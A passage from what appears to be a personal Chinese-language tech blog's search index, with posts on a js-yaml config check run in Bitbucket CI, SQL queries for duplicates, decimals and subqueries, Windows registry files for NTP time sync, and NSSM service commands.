href=\"http://linux.vbird.org/linux_basic/0410accountmanager.php#userswitch\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – 第十三章、Linux 帳號管理與 ACL 權限設定</a><br><a href=\"https://linux.cn/article-11399-1.html\" target=\"_blank\" rel=\"noopener\">技术|chgrp 和 newgrp 命令简介</a></p>\n","categories":["Linux"],"tags":["Linux","su","sudo"]},{"title":"寫測試程式用js-yaml對設定檔做簡查","url":"/blog/2017/12/13/logdown/2017-12-13-js-yaml-write-test-program-to-do-a-simple-check-on-configuration-files/","content":"<p>因為要做動物機要做自動化<br>載入yaml想檢查一些設定是不是有錯誤<br>利用上一篇寫的<a href=\"http://malagege.logdown.com/posts/4442432-exit-codes-program-return-error-code\" target=\"_blank\" rel=\"noopener\">Exit Codes 程式回傳錯誤碼 « 進擊的程式新手</a><br>在透過Bitbucket做設定<br>今天進行還滿順利<br>在此筆記</p>\n<a id=\"more\"></a>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">yaml = <span class=\"built_in\">require</span>(<span class=\"string\">\"js-yaml\"</span>);</span><br><span class=\"line\">fs = <span class=\"built_in\">require</span>(<span class=\"string\">\"fs\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Get document, or throw exception on error</span></span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> doc = yaml.safeLoad(fs.readFileSync(<span class=\"string\">'config.yml'</span>, <span class=\"string\">'utf8'</span>));</span><br><span class=\"line\">  <span class=\"comment\">//console.log(doc);</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'沒法正常解析yaml'</span>);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.error(e);</span><br><span class=\"line\">  process.exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">yaml = <span class=\"built_in\">require</span>(<span class=\"string\">\"js-yaml\"</span>);</span><br><span class=\"line\">fs = <span class=\"built_in\">require</span>(<span class=\"string\">\"fs\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Get document, or throw exception on error</span></span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> doc = yaml.safeLoad(fs.readFileSync(<span class=\"string\">'config.yml'</span>, <span class=\"string\">'utf8'</span>));</span><br><span class=\"line\">  <span class=\"comment\">//console.log(doc);</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'沒法正常解析yaml'</span>);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.error(e);</span><br><span class=\"line\">  process.exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> default_path = doc.templates.default.transmission.path;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> olddownload_path = doc.templates.olddownload.transmission.path;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> autoPass_path = doc.templates.autoPass.transmission.path;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> default_month = default_path.substr(<span class=\"number\">32</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> olddownload_month = olddownload_path.substr(<span class=\"number\">32</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> autoPass_month = autoPass_path.substr(<span class=\"number\">32</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> now_month = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>().getMonth();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> month_maping = &#123;</span><br><span class=\"line\">        <span class=\"string\">'0'</span> : <span class=\"string\">'01'</span>,</span><br><span class=\"line\">        <span class=\"string\">'1'</span> : <span class=\"string\">'01'</span>,</span><br><span class=\"line\">        <span class=\"string\">'2'</span> : <span class=\"string\">'01'</span>,</span><br><span class=\"line\">        <span class=\"string\">'3'</span> : <span class=\"string\">'04'</span>,</span><br><span class=\"line\">        <span class=\"string\">'4'</span> : <span class=\"string\">'04'</span>,</span><br><span class=\"line\">        <span class=\"string\">'5'</span> : <span class=\"string\">'04'</span>,</span><br><span class=\"line\">        <span class=\"string\">'6'</span> : <span class=\"string\">'07'</span>,</span><br><span class=\"line\">        <span class=\"string\">'7'</span> : <span class=\"string\">'07'</span>,</span><br><span class=\"line\">        <span class=\"string\">'8'</span> : <span class=\"string\">'07'</span>,</span><br><span class=\"line\">        <span class=\"string\">'09'</span> : <span class=\"string\">'10'</span>,</span><br><span class=\"line\">        <span class=\"string\">'10'</span> : <span class=\"string\">'10'</span>,</span><br><span class=\"line\">        <span class=\"string\">'11'</span> : <span class=\"string\">'10'</span>,</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (month_maping[now_month] != default_month) <span class=\"keyword\">throw</span> <span class=\"string\">\"config.yml裡default_path沒設定正確(\"</span> + month_maping[now_month] +<span class=\"string\">\")月份名稱\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (month_maping[now_month<span class=\"number\">-3</span>] != olddownload_month) <span class=\"keyword\">throw</span> <span class=\"string\">\"config.yml裡olddownload_month沒設定正確(\"</span> + month_maping[now_month] + <span class=\"string\">\")月份名稱\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (month_maping[now_month<span class=\"number\">-3</span>] != autoPass_month) <span class=\"keyword\">throw</span> <span class=\"string\">\"config.yml裡autoPass_month沒設定正確(\"</span> + month_maping[now_month] + <span class=\"string\">\")月份名稱\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (error) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.error(error);</span><br><span class=\"line\">    process.exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'測試正常'</span>);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">image: node:6.9.4</span><br><span class=\"line\"></span><br><span class=\"line\">pipelines:</span><br><span class=\"line\">  default:</span><br><span class=\"line\">    - step:</span><br><span class=\"line\">        script: # Modify the commands below to build your repository.</span><br><span class=\"line\">          - npm install -g yaml-lint</span><br><span class=\"line\">          - yamllint config.yml</span><br><span class=\"line\">          - npm install</span><br><span class=\"line\">          - npm test</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;name&quot;: &quot;yaml_config&quot;,</span><br><span class=\"line\">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class=\"line\">  &quot;description&quot;: &quot;&quot;,</span><br><span class=\"line\">  &quot;main&quot;: &quot;test.js&quot;,</span><br><span class=\"line\">  &quot;dependencies&quot;: &#123;</span><br><span class=\"line\">    &quot;js-yaml&quot;: &quot;^3.10.0&quot;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &quot;devDependencies&quot;: &#123;&#125;,</span><br><span class=\"line\">  &quot;scripts&quot;: &#123;</span><br><span class=\"line\">    &quot;test&quot;: &quot;node test&quot;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &quot;repository&quot;: &#123;</span><br><span class=\"line\">    &quot;type&quot;: &quot;git&quot;,</span><br><span class=\"line\">    &quot;url&quot;: &quot;git+https://malagege@bitbucket.org/malagege/yaml_config.git&quot;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &quot;author&quot;: &quot;&quot;,</span><br><span class=\"line\">  &quot;license&quot;: &quot;ISC&quot;,</span><br><span class=\"line\">  &quot;homepage&quot;: &quot;https://bitbucket.org/malagege/yaml_config#readme&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","categories":["CI"],"tags":["自動化","js-yaml","yaml","測試"]},{"title":"取得重覆資料最新SQL","url":"/blog/2017/12/18/logdown/2017-12-18-get-the-latest-sql-for-duplicate-data/","content":"<p>在<a href=\"https://www.facebook.com/groups/616369245163622/permalink/1222070147926859/\" target=\"_blank\" rel=\"noopener\">Backend 台灣 (Backend Tw)</a>看到<br>如下<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> m1.*</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> messages m1 <span class=\"keyword\">LEFT</span> <span class=\"keyword\">JOIN</span> messages m2</span><br><span class=\"line\"> <span class=\"keyword\">ON</span> (m1.name = m2.name <span class=\"keyword\">AND</span> m1.id &lt; m2.id)</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span> m2.id <span class=\"keyword\">IS</span> <span class=\"literal\">NULL</span>;</span><br></pre></td></tr></table></figure></p>\n<p>這寫法很有趣XD</p>\n<blockquote>\n<p>Triton Ho:<br>Group by是 O(n log n)<br>Left join 是O(n^2)</p>\n</blockquote>\n<blockquote>\n<p>George Li Chino Lin :<br>實際上我如果把資料降到10比左右, 這兩種query 的效能就沒有明顯差異～<br><a href=\"http://sqlfiddle.com/#!9/296a6a/1\" target=\"_blank\" rel=\"noopener\">http://sqlfiddle.com/#!9/296a6a/1</a><br><a href=\"http://sqlfiddle.com/#!9/296a6a/2\" target=\"_blank\" rel=\"noopener\">http://sqlfiddle.com/#!9/296a6a/2</a><br>但是筆數拉到300左右就有明顯差異了～<br>所以合理判斷資料量上升～ 效能差距會越明顯～<br>資料更大的話基本上沒辦法用這平台了ＸＤ</p>\n</blockquote>\n<blockquote>\n<p>Chino Lin:<br>我自己用一個表約100萬筆來測試<br>使用left join方式 跑到超過6分鐘沒等下去 ，<br>但是用子查詢groupby 大約1秒就跑完<br>後來改成4萬筆left join跑了2分15才跑完<br>子查詢+groupby也是大約1秒就跑完<br>我的是mysql5.6<br>那我看還是用子查詢+groupby就好…….<br>可能是5.0太舊不值得參考了</p>\n</blockquote>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> messages</span><br><span class=\"line\"><span class=\"keyword\">where</span> <span class=\"keyword\">Id</span> <span class=\"keyword\">in</span> (<span class=\"keyword\">select</span> <span class=\"keyword\">max</span>(<span class=\"keyword\">id</span>) <span class=\"keyword\">from</span> messages <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> <span class=\"keyword\">Name</span>)</span><br></pre></td></tr></table></figure>\n<h1 id=\"補充\"><a href=\"#補充\" class=\"headerlink\" title=\"補充\"></a>補充</h1><p>可能是MySQL版本問題，正常應該要用Group by 效能會比較好，看到這種特別SQL滿好奇，但這不是最好的解法<br>純心賞看看就好，更多東西去<a href=\"https://www.facebook.com/groups/616369245163622/permalink/1222070147926859/\" target=\"_blank\" rel=\"noopener\">Backend 台灣 (Backend Tw)</a>裡面看看</p>\n","categories":["SQL"],"tags":["sql"]},{"title":"不同電腦時間同步方法之一(NTP 同步)","url":"/blog/2017/12/23/logdown/2017-12-23-one-of-the-different-computer-time-synchronization-methods-ntp-synchronization/","content":"<p>最近做生理監測設定，組長發現廠商時間上傳時間跟HIS不太合理<br>就是<strong>測量時間</strong>會大於<strong>上傳時間</strong><br>這怎麼那麼奇怪!!!但用想也知道是設備跟Server不同步<br>這時候NTP就派上用場了<br>終於用在實務上</p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><figcaption><span>時間同步20s.reg</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">Windows Registry Editor Version 5.00</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DateTime\\Servers]</span><br><span class=\"line\">@=&quot;0&quot;</span><br><span class=\"line\">&quot;0&quot;=&quot;**IP**&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\W32Time\\TimeProviders\\NtpClient]</span><br><span class=\"line\">&quot;DllName&quot;=hex(2):25,00,73,00,79,00,73,00,74,00,65,00,6d,00,72,00,6f,00,6f,00,\\</span><br><span class=\"line\">  74,00,25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,77,\\</span><br><span class=\"line\">  00,33,00,32,00,74,00,69,00,6d,00,65,00,2e,00,64,00,6c,00,6c,00,00,00</span><br><span class=\"line\">&quot;Enabled&quot;=dword:00000001</span><br><span class=\"line\">&quot;InputProvider&quot;=dword:00000001</span><br><span class=\"line\">&quot;AllowNonstandardModeCombinations&quot;=dword:00000001</span><br><span class=\"line\">&quot;CrossSiteSyncFlags&quot;=dword:00000002</span><br><span class=\"line\">&quot;ResolvePeerBackoffMinutes&quot;=dword:0000000f</span><br><span class=\"line\">&quot;ResolvePeerBackoffMaxTimes&quot;=dword:00000007</span><br><span class=\"line\">&quot;CompatibilityFlags&quot;=dword:80000000</span><br><span class=\"line\">&quot;EventLogFlags&quot;=dword:00000001</span><br><span class=\"line\">&quot;LargeSampleSkew&quot;=dword:00000003</span><br><span class=\"line\">&quot;SpecialPollInterval&quot;=dword:00000014</span><br><span class=\"line\">&quot;SpecialPollTimeRemaining&quot;=hex(7):74,00,69,00,6d,00,65,00,2e,00,77,00,69,00,6e,\\</span><br><span class=\"line\">  00,64,00,6f,00,77,00,73,00,2e,00,63,00,6f,00,6d,00,2c,00,37,00,64,00,37,00,\\</span><br><span class=\"line\">  37,00,61,00,65,00,31,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\\</span><br><span class=\"line\">  00,00,00,00,00,00,00</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><figcaption><span>time60s.reg</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">Windows Registry Editor Version 5.00</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DateTime\\Servers]</span><br><span class=\"line\">@=&quot;0&quot;</span><br><span class=\"line\">&quot;0&quot;=&quot;**IP**&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\W32Time\\TimeProviders\\NtpClient]</span><br><span class=\"line\">&quot;DllName&quot;=hex(2):25,00,73,00,79,00,73,00,74,00,65,00,6d,00,72,00,6f,00,6f,00,\\</span><br><span class=\"line\">  74,00,25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,77,\\</span><br><span class=\"line\">  00,33,00,32,00,74,00,69,00,6d,00,65,00,2e,00,64,00,6c,00,6c,00,00,00</span><br><span class=\"line\">&quot;Enabled&quot;=dword:00000001</span><br><span class=\"line\">&quot;InputProvider&quot;=dword:00000001</span><br><span class=\"line\">&quot;AllowNonstandardModeCombinations&quot;=dword:00000001</span><br><span class=\"line\">&quot;CrossSiteSyncFlags&quot;=dword:00000002</span><br><span class=\"line\">&quot;ResolvePeerBackoffMinutes&quot;=dword:0000000f</span><br><span class=\"line\">&quot;ResolvePeerBackoffMaxTimes&quot;=dword:00000007</span><br><span class=\"line\">&quot;CompatibilityFlags&quot;=dword:80000000</span><br><span class=\"line\">&quot;EventLogFlags&quot;=dword:00000001</span><br><span class=\"line\">&quot;LargeSampleSkew&quot;=dword:00000003</span><br><span class=\"line\">&quot;SpecialPollInterval&quot;=dword:0000003c</span><br><span class=\"line\">&quot;SpecialPollTimeRemaining&quot;=hex(7):74,00,69,00,6d,00,65,00,2e,00,77,00,69,00,6e,\\</span><br><span class=\"line\">  00,64,00,6f,00,77,00,73,00,2e,00,63,00,6f,00,6d,00,2c,00,37,00,64,00,37,00,\\</span><br><span class=\"line\">  37,00,61,00,65,00,31,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\\</span><br><span class=\"line\">  00,00,00,00,00,00,00</span><br></pre></td></tr></table></figure>\n<p>需要點登入檔案，重新開機才會生效。<br>這次經驗讓我知道設定NTP是很重要的事情<br>組長問我NTP時間一定會正確嗎？我後來網路查一下<br>NTP運算會扣除網路傳輸部份，所以不會有兩台電腦時間不一樣問題</p>\n<ul>\n<li><a href=\"https://blog.miniasp.com/post/2009/06/08/How-to-adjust-Time-using-Windows-Time-Service.aspx\" target=\"_blank\" rel=\"noopener\">The Will Will Web | 如何調整 Windows 作業系統的時間正確性 ( 終極指令版 )</a></li>\n<li><a href=\"http://xyz.cinc.biz/2015/04/windows-w32tm.html\" target=\"_blank\" rel=\"noopener\">XYZ的筆記本: windows 時間自動校正</a></li>\n</ul>\n","categories":["Linux"],"tags":["NTP"]},{"title":"SQL判斷快否有小數點","url":"/blog/2017/12/23/logdown/2017-12-23-sql-judge-fast-no-decimal-point/","content":"<p>今天要查詢商品價格有小數點的，爬一下Google<br>有查到不錯方法，記錄一下</p>\n<a id=\"more\"></a>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span>   col1,</span><br><span class=\"line\"><span class=\"keyword\">case</span>   col1   <span class=\"keyword\">when</span>  <span class=\"keyword\">cast</span>(col1  <span class=\"keyword\">as</span> <span class=\"built_in\">int</span>) <span class=\"keyword\">then</span> <span class=\"string\">'不是'</span> <span class=\"keyword\">else</span> <span class=\"string\">'是'</span> <span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">from</span>   表<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span>   col1</span><br><span class=\"line\"><span class=\"keyword\">from</span>   表<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">where</span> col1 &lt;&gt; <span class=\"keyword\">cast</span>(col1 <span class=\"keyword\">as</span> <span class=\"built_in\">int</span>)</span><br></pre></td></tr></table></figure>\n<h1 id=\"參考來源\"><a href=\"#參考來源\" class=\"headerlink\" title=\"參考來源\"></a>參考來源</h1><p><a href=\"http://wushinetlife.blogspot.com/2012/02/sql_3749.html\" target=\"_blank\" rel=\"noopener\">邏輯生活: SQL 判斷值是否有小數點</a></p>\n","categories":["SQL"],"tags":["sql"]},{"title":"SQL子查詢筆記(相關子查詢/非相關子查詢)","url":"/blog/2017/12/23/logdown/2017-12-23-sql-subquery-notes/","content":"<p><del>之前用子查詢第二層，竟然抓不到外層的欄位</del><br>已經找到 <a href=\"https://malagege.github.io/blog/2018/12/24/%E7%B5%82%E6%96%BC%E7%9F%A5%E9%81%93%E7%82%BA%E4%BB%80%E9%BA%BC%E5%AD%90%E6%9F%A5%E8%A9%A2%E6%B2%92%E8%BE%A6%E6%B3%95%E6%8A%93%E5%8F%96%E5%A4%96%E9%9D%A2%E7%9A%84%E8%A1%A8/\">終於知道為什麼子查詢沒辦法抓取外面的表 | 程式狂想筆記</a><br>有時候跟本不知道為什麼?後來問公司的前軰，他說第二層就抓不到最外一層<br>但這種強制記這種觀念感覺不是很好，今天 Google 查一下原因<br>在這邊整理一下 XD</p>\n<a id=\"more\"></a>\n<p>今天<a href=\"http://blog.itpub.net/16591471/viewspace-695491/\" target=\"_blank\" rel=\"noopener\">多層次子查詢的 sql 執行順序的問題-wj_zizi-ITPUB 博客</a>和<a href=\"http://blog.jobbole.com/95027/\" target=\"_blank\" rel=\"noopener\">你真的会玩 SQL 吗？无处不在的子查询 - 文章 - 伯乐在线</a><br>看到子查詢有分兩類</p>\n<ol>\n<li>相關子查詢</li>\n<li>非相關子查詢</li>\n</ol>\n<p>這兩個其實不難分，不要被兩個專有名詞嚇到<br>先講非相關子查詢，簡單講就是子查詢跟外面 SQL 查詢內容沒有相關<br>非相關子查詢只會跑一次，所以效能上會非常快<br>執行順序也比外層先，所以這也是為什麼<strong>非相關子查詢</strong>沒法取得外層欄位的原因<br>範例如下，以下子查詢只會查一次</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> *</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> xxxx</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span> <span class=\"keyword\">class</span> = (<span class=\"keyword\">SELECT</span> <span class=\"keyword\">max</span>(<span class=\"keyword\">cost</span>)</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> bbbb</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>相關子查詢就反知，比較吃效能，每一行都會執行 loop<br>先不談<a href=\"https://github.com/TritonHo/slides/blob/master/Taipei%202016-08%20talk/SQL_reporting.pdf\" target=\"_blank\" rel=\"noopener\">slides/SQL_reporting.pdf at master · TritonHo/slides</a>裡面有介紹有些 DB 會自動做 join 動作<br>這個我們比較常用到</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span>＊</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> xxxx a</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span> <span class=\"keyword\">cost</span> &gt; (<span class=\"keyword\">SELECT</span> <span class=\"keyword\">avg</span>(<span class=\"keyword\">cost</span>)</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> bbbb</span><br><span class=\"line\"><span class=\"keyword\">where</span> <span class=\"keyword\">class</span> = a.class</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> *</span><br><span class=\"line\">  <span class=\"keyword\">FROM</span> a1</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span> <span class=\"keyword\">EXISTS</span></span><br><span class=\"line\">(<span class=\"keyword\">SELECT</span> <span class=\"string\">'X'</span></span><br><span class=\"line\">          <span class=\"keyword\">FROM</span> (<span class=\"keyword\">SELECT</span> w2.corp_id <span class=\"keyword\">FROM</span> a1 w2 <span class=\"keyword\">WHERE</span> w2.period_id &lt;= a1.period_id) u</span><br><span class=\"line\">         <span class=\"keyword\">WHERE</span> u.corp_id = a1.corp_id);</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://www.itpub.net/thread-1027910-1-1.html#post_11069036\" target=\"_blank\" rel=\"noopener\">第二层子查询居然不认最外层表中的列 - Oracle 开发 - ITPUB 论坛－中国最专业的 IT 技术社区</a>看到有不能跑的 example<br>目前猜測 form 是非相關子查詢，我猜因為 from 會先執行，所以抓不到外層</p>\n<p><a href=\"http://blog.itpub.net/28612416/viewspace-773763/\" target=\"_blank\" rel=\"noopener\">sql 语法相关子查询与非相关子查询-流浪的野狼-ITPUB 博客</a>看到一個標量子查詢(相對於多值子查詢)名稱</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> OrderId <span class=\"keyword\">From</span> Orders <span class=\"keyword\">where</span> EmployeeId <span class=\"keyword\">IN</span></span><br><span class=\"line\">(<span class=\"keyword\">select</span> EmployeeId <span class=\"keyword\">From</span> employees <span class=\"keyword\">where</span> lastName <span class=\"keyword\">like</span> <span class=\"string\">'Da%'</span>)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>將’Davolio’改為’D%’時,這個時候子查詢中返回結果為 2 行,等號右邊此時為多值,查詢失敗.將’=’改為 in 謂詞.查詢才能通過.<br>employees 表中無 lastname=’jason’,外部查詢將返回 null.</p>\n</blockquote>\n<h2 id=\"結論\"><a href=\"#結論\" class=\"headerlink\" title=\"結論\"></a>結論</h2><p>SQL 有太多東西要學了 XD<br>這些離清楚之後比較不容易採到雷<br>要學的東西太多了 orz</p>\n<p>###20171226 無聊寫的 SQL</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> a.id, a.rev, a.content</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> <span class=\"string\">`docs`</span> a</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span> a.id  <span class=\"keyword\">IN</span>  (</span><br><span class=\"line\">    <span class=\"keyword\">SELECT</span> <span class=\"keyword\">max</span>(<span class=\"keyword\">id</span>)</span><br><span class=\"line\">    <span class=\"keyword\">FROM</span> <span class=\"string\">`docs`</span> b</span><br><span class=\"line\">    <span class=\"keyword\">WHERE</span>  b.id <span class=\"keyword\">IN</span> (<span class=\"keyword\">SELECT</span> <span class=\"keyword\">id</span></span><br><span class=\"line\">                    <span class=\"keyword\">FROM</span> <span class=\"string\">`docs`</span> c</span><br><span class=\"line\">                    <span class=\"keyword\">WHERE</span> c.id=a.id)</span><br><span class=\"line\">) ;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://sqlfiddle.com/#!9/a6c585/30596\" target=\"_blank\" rel=\"noopener\">http://sqlfiddle.com/#!9/a6c585/30596</a><br>原本以為只會有一筆</p>\n<p>是 From a table 先執行 而 a 有四筆<br>子查詢關連 a.id<br>所以結果是 4 筆沒錯<br>做 max 也會沒有意義</p>\n<h1 id=\"參考來源\"><a href=\"#參考來源\" class=\"headerlink\" title=\"參考來源\"></a>參考來源</h1><p><a href=\"http://blog.jobbole.com/95027/\" target=\"_blank\" rel=\"noopener\">你真的会玩 SQL 吗？无处不在的子查询 - 文章 - 伯乐在线</a></p>\n<p><a href=\"https://books.google.com.tw/books?id=OhdwHgymgtcC&amp;pg=PA146&amp;lpg=PA146&amp;dq=%E9%9D%9E%E7%9B%B8%E9%97%9C%E5%AD%90%E6%9F%A5%E8%A9%A2&amp;source=bl&amp;ots=0LYsR2GAVw&amp;sig=pLLTLhWDAIn-Pi1bBbW96wvTkFg&amp;hl=zh-TW&amp;sa=X&amp;ved=0ahUKEwj-3eyKzKDYAhUKT7wKHbkyAKQ4ChDoAQg1MAI#v=onepage&amp;q=%E9%9D%9E%E7%9B%B8%E9%97%9C%E5%AD%90%E6%9F%A5%E8%A9%A2&amp;f=false\" target=\"_blank\" rel=\"noopener\">对象-关系数据库管理系统原理与实现 - 李战怀, 李红燕, 徐秋元 - Google 圖書</a></p>\n<p><a href=\"http://blog.jobbole.com/95027/\" target=\"_blank\" rel=\"noopener\">你真的会玩 SQL 吗？无处不在的子查询 - 文章 - 伯乐在线</a></p>\n<p><a href=\"http://blog.itpub.net/16591471/viewspace-695491/\" target=\"_blank\" rel=\"noopener\">多層次子查詢的 sql 執行順序的問題-wj_zizi-ITPUB 博客</a></p>\n<p><a href=\"http://www.itpub.net/thread-1027910-1-1.html#post_11069036\" target=\"_blank\" rel=\"noopener\">第二层子查询居然不认最外层表中的列 - Oracle 开发 - ITPUB 论坛－中国最专业的 IT 技术社区</a></p>\n<p><a href=\"https://www.ptt.cc/bbs/Database/M.1152841888.A.596.html\" target=\"_blank\" rel=\"noopener\">[SQL ] 兩層以上子查詢辨認 Table 別名 - 看板 Database - 批踢踢實業坊</a></p>\n<p><a href=\"http://www.wenwenti.info/article/72559\" target=\"_blank\" rel=\"noopener\">相關子查詢和嵌套子查詢 - 問問題</a></p>\n<p><a href=\"https://tw.saowen.com/a/a4610b9e7cb588e070f8e48aade920ab12a63ef681d994ccbfcb6753553bc466\" target=\"_blank\" rel=\"noopener\">MySql 學習(三) —— 子查詢(where、from、exists) 及 連線查詢(left join、right join、inner join、union join) - 掃文資訊</a></p>\n<p><a href=\"http://www.cnblogs.com/chiangchou/p/mysql-3.html\" target=\"_blank\" rel=\"noopener\">MySql 学习(三) —— 子查询(where、from、exists) 及 连接查询(left join、right join、inner join、union join) - bojiangzhou - 博客园</a></p>\n<p><a href=\"http://blog.itpub.net/28612416/viewspace-773763/\" target=\"_blank\" rel=\"noopener\">sql 语法相关子查询与非相关子查询-流浪的野狼-ITPUB 博客</a></p>\n","categories":["SQL"],"tags":["sql","相關子查詢","非相關子查詢"]},{"title":"不用寫程式也能做Window Service(NSSM)","url":"/blog/2017/12/23/logdown/2017-12-23-you-can-do-window-service-without-writing-a-program/","content":"<p>最近常常執行chat server，需要常常自己開<br>後來有時忘記開，怕之後有忘記開還有下面執行列多一個很討厭<br>所以我上網找了一下Window Service有什麼方法可以做<br>竟然看到不用寫程式，但前提是需要裝這個工具<br>不多說，先來筆記</p>\n<a id=\"more\"></a>\n<p>#指令</p>\n<h2 id=\"啟動服務\"><a href=\"#啟動服務\" class=\"headerlink\" title=\"啟動服務\"></a>啟動服務</h2><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ nssm start <span class=\"string\">\"服務名稱\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"停止服務\"><a href=\"#停止服務\" class=\"headerlink\" title=\"停止服務\"></a>停止服務</h2><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ nssm stop <span class=\"string\">\"服務名稱\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"重啟服務\"><a href=\"#重啟服務\" class=\"headerlink\" title=\"重啟服務\"></a>重啟服務</h2><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ nssm restart <span class=\"string\">\"服務名稱\"</span></span><br></pre></td></tr></table></figure>\n<h2 